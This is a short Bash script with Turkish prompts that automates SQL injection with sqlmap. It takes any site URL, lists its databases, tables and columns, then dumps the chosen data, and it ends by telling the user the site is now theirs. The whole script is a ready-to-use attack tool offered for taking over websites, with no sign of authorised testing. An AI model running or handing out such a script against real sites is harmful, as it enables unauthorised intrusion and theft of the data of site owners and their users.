echo """

- QAWEXSA -

"""

echo -e "\e[36m ➛  otomatik sqlmap'e hoşgeldin ♪\e[2"
read -p "taramak istediğin site url gir : " url


echo "$url database'i taranıyor soru gelirse y de ve enterla :)..."
sqlmap -u $url --dbs

read -p "database taranmıştır çıkan database adını yaz : " data

sqlmap -u $url -D $data --tables

echo "tablelar cekiliyor bekleyiniz soru gelirse y yaz enterla..."

read -p "Tablelar çekilmiştir şimdi ise girmek istediğin table adını yaz : " table

echo "Çekiliyor bekleyiniz :)"
sqlmap -u $url -D $data -T $table --columns

echo "Columnlar çekildi sonuclar yukardakı gıbıdır knk"

read -p "şimdi ise columnları gir dump edicem :d" columske

sqlmap -u $url -D $data -T $table -C $columske --dump


echo "site artık senindir!"
echo "herangi bir sorun için dc qawexsa :)"
